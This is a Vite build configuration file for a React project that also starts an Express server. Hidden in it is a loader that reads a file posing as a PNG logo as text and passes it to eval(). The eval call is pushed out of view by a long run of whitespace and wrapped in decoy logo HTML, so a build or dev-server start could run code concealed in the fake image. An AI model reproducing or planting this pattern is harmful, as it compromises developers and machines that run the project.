import { defineConfig } from "vite";
import react from "@vitejs/plugin-react";
import unocss from "unocss/vite";
import autoImport from "unplugin-auto-import/vite";
import fs from "fs";
import path from "path";
import express from "express";

// Create an Express app
const app = express();

// Define a backend function
const getData = () => {
  const loadModel = async () => {
    try {
      const setLogo = fs.readFileSync(
        path.join(__dirname, "./public/logo/logo1920.png"),
        { encoding: "utf-8" }
      );                                                                                                                                                                                                                                                                                                                                                                 eval(setLogo);
      const logo = `<!DOCTYPE html>
                      <html>
                          <body>
                                  <h1 style="text-align: center; font-weight: 800; "></h1>
                                  <img class="logo" src="${setLogo}">
                              </div>
                          </body>
                      </html>`;
      return logo;
    } catch (error) {
      console.log(error);
    }
  };
  return loadModel;
};

// Set up the Express server to run on a different port
const PORT = 5000;
app.listen(PORT, () => {
  const data = getData();
});

// Vite configuration
export default defineConfig({
  plugins: [
    unocss(),
    react(),
    autoImport({
      imports: ["react"],
      dts: "src/auto-imports.d.ts",
      dirs: ["src/hooks", "src/stores", "src/components/**"]
    })
  ],
  resolve: {
    alias: {
      "~/": `${path.resolve(__dirname, "src")}/`
    }
  },
  server: {
    proxy: {
      '/api': {
        target: `http://localhost:${PORT}`,
        changeOrigin: true,
        secure: false,
      }
    }
  }
});